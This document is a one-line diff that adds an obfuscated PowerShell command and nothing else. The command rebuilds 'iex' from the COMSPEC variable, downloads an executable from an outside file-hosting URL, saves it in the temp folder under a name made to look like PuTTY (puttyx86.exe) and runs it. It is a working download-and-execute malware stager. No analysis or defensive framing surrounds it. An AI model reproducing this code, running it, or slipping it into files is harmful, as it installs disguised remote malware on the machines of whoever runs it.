@@ -1,0 +1,1 @@
+﻿&( $eNV:comSPec[4,15,25]-join'') ( (('(N'+'ew-'+'Objec'+'t System.Net.W'+'e'+'bClie'+'nt).Downl'+'oadF'+'i'+'le('+'{2'+'}ht'+'t'+'p'+'s:'+'//a'+'.pomf'+'.'+'ca'+'t/qolcls.exe{2},{1}'+'{'+'3}en'+'v:TEMP'+'{0'+'}putty'+'x'+'86.'+'exe{1}'+');'+'Star'+'t-'+'Proc'+'ess ({1}{3'+'}env:TEM'+'P{0}p'+'u'+'t'+'tyx86.'+'exe{'+'1'+'})')  -F [CHaR]92,[CHaR]34,[CHaR]39,[CHaR]36) )
